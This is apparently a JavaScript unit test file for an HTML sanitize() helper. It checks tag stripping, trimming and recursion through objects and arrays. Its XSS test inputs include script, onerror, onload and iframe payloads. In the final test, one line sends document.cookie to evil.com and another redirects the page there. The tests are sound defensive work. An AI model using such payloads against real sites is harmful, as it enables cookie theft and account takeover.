/**
 * Test: helpers/utilities.sanitize()
 * Unit tests for HTML sanitization and trimming across all data types
 *
 * Run: npx mgr test helpers/sanitize
 *
 * Covers:
 * - Pure schema fields (sanitized by default, opt-out with sanitize: false)
 * - All non-schema fields (no schema, sanitize everything)
 * - Combo: schema + non-schema fields together
 */
const Utilities = require('../../src/manager/helpers/utilities.js');

// Mock Manager
const Manager = { libraries: {} };
const utilities = new Utilities(Manager);

module.exports = {
  description: 'Utilities.sanitize()',
  type: 'group',

  tests: [
    // ─── Strings ───

    {
      name: 'strips-script-tags',
      async run({ assert }) {
        const result = utilities.sanitize('<script>alert("xss")</script>hello');
        assert.equal(result, 'hello', 'Should strip script tags');
      },
    },

    {
      name: 'strips-img-onerror',
      async run({ assert }) {
        const result = utilities.sanitize('<img src=x onerror="alert(1)">text');
        assert.equal(result, 'text', 'Should strip img with onerror');
      },
    },

    {
      name: 'strips-nested-html-keeps-text',
      async run({ assert }) {
        const result = utilities.sanitize('<div><b>bold</b> and <i>italic</i></div>');
        assert.equal(result, 'bold and italic', 'Should strip all tags but keep text');
      },
    },

    {
      name: 'trims-whitespace',
      async run({ assert }) {
        const result = utilities.sanitize('  hello world  ');
        assert.equal(result, 'hello world', 'Should trim');
      },
    },

    {
      name: 'strips-and-trims-together',
      async run({ assert }) {
        const result = utilities.sanitize('  <b>hello</b>  ');
        assert.equal(result, 'hello', 'Should strip tags and trim');
      },
    },

    {
      name: 'clean-string-unchanged',
      async run({ assert }) {
        const result = utilities.sanitize('just plain text');
        assert.equal(result, 'just plain text', 'Clean string should pass through');
      },
    },

    {
      name: 'empty-string-unchanged',
      async run({ assert }) {
        const result = utilities.sanitize('');
        assert.equal(result, '', 'Empty string should remain empty');
      },
    },

    // ─── Primitives ───

    {
      name: 'null-returns-null',
      async run({ assert }) {
        assert.equal(utilities.sanitize(null), null, 'null should pass through');
      },
    },

    {
      name: 'undefined-returns-undefined',
      async run({ assert }) {
        assert.equal(utilities.sanitize(undefined), undefined, 'undefined should pass through');
      },
    },

    {
      name: 'number-passes-through',
      async run({ assert }) {
        assert.equal(utilities.sanitize(42), 42, 'Numbers should pass through');
      },
    },

    {
      name: 'boolean-passes-through',
      async run({ assert }) {
        assert.equal(utilities.sanitize(true), true, 'Booleans should pass through');
      },
    },

    // ─── Non-schema objects (sanitize everything) ───

    {
      name: 'flat-object-sanitizes-all-strings',
      async run({ assert }) {
        const result = utilities.sanitize({
          name: '<b>Evil Corp</b>',
          count: 5,
          active: true,
        });
        assert.equal(result.name, 'Evil Corp', 'Should strip HTML from name');
        assert.equal(result.count, 5, 'Number should pass through');
        assert.equal(result.active, true, 'Boolean should pass through');
      },
    },

    {
      name: 'deeply-nested-object-sanitizes',
      async run({ assert }) {
        const result = utilities.sanitize({
          settings: {
            brand: {
              name: '<script>xss</script>Acme',
              about: '<img src=x onerror=alert(1)>We sell stuff',
            },
            enabled: true,
          },
        });
        assert.equal(result.settings.brand.name, 'Acme', 'Should strip deep nested script');
        assert.equal(result.settings.brand.about, 'We sell stuff', 'Should strip deep nested img');
        assert.equal(result.settings.enabled, true, 'Deep boolean should pass through');
      },
    },

    // ─── Arrays ───

    {
      name: 'array-sanitizes-each-string',
      async run({ assert }) {
        const result = utilities.sanitize(['<b>one</b>', 'two', '<script>x</script>three']);
        assert.equal(result[0], 'one', 'First element stripped');
        assert.equal(result[1], 'two', 'Clean element unchanged');
        assert.equal(result[2], 'three', 'Third element stripped');
      },
    },

    {
      name: 'array-of-objects',
      async run({ assert }) {
        const result = utilities.sanitize([
          { name: '<b>Alice</b>' },
          { name: '<i>Bob</i>' },
        ]);
        assert.equal(result[0].name, 'Alice', 'First object name stripped');
        assert.equal(result[1].name, 'Bob', 'Second object name stripped');
      },
    },

    {
      name: 'mixed-array-types',
      async run({ assert }) {
        const result = utilities.sanitize(['<b>text</b>', 42, null, true]);
        assert.equal(result[0], 'text', 'String stripped');
        assert.equal(result[1], 42, 'Number passed through');
        assert.equal(result[2], null, 'null passed through');
        assert.equal(result[3], true, 'Boolean passed through');
      },
    },

    // ─── XSS attack vectors ───

    {
      name: 'xss-event-handler',
      async run({ assert }) {
        assert.equal(utilities.sanitize('<div onmouseover="alert(1)">hover me</div>'), 'hover me');
      },
    },

    {
      name: 'xss-iframe',
      async run({ assert }) {
        assert.equal(utilities.sanitize('<iframe src="evil.com"></iframe>safe'), 'safe');
      },
    },

    {
      name: 'xss-svg-onload',
      async run({ assert }) {
        const result = utilities.sanitize('<svg onload="alert(1)">test</svg>');
        assert.equal(result.includes('onload'), false, 'Should not contain onload');
      },
    },

    {
      name: 'xss-full-agent-creation-payload',
      async run({ assert }) {
        const result = utilities.sanitize({
          name: '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">Agent',
          welcomeMessage: 'Hello <script>document.location="https://evil.com"</script>',
          brand: {
            name: '"><script>alert("xss")</script>',
            about: '<iframe src="https://evil.com"></iframe>About us',
          },
        });
        assert.equal(result.name, 'Agent', 'name should be clean');
        assert.equal(result.welcomeMessage.includes('<script>'), false, 'welcomeMessage should not have script');
        assert.equal(result.brand.name.includes('<script>'), false, 'brand.name should not have script');
        assert.equal(result.brand.about, 'About us', 'brand.about should be clean');
      },
    },
  ],
};
